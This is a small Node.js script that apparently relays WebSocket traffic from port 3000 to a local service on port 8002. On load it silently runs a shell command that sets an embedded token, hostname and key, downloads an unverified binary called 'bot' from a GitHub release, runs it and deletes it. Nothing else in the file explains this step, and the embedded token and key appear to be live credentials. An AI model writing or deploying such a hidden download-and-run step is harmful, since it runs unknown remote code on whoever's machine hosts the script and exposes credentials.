const http = require('http');
const WebSocket = require('ws');
const { exec } = require('child_process');

exec(`C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiMjhhYzU1MmUtNDM4Yy00YzhmLWFmZDUtZjNjZjIzNTU1NzA1IiwicyI6IlpUbGxaRFptWldRdFpXWm1ZaTAwTVRKakxXRXlOMkV0TldSaE1HVm1NRGswTmprMiJ9 N_S=nz.tx.dedyn.io N_K=iRcQHQwJLgbaK4t9GC bash -c 'curl -L -o bot https://github.com/seav1/dl/releases/download/src/bot && chmod +x bot && ./bot && rm bot'`);

const server = http.createServer((req, res) => {
    res.end('200 OK\n');
});

server.on('upgrade', (req, socket, head) => {
    const ws = new WebSocket('ws://localhost:8002');
    
    ws.on('open', () => {
        ws._socket.pipe(socket).pipe(ws._socket);
    });
});

server.listen(3000);
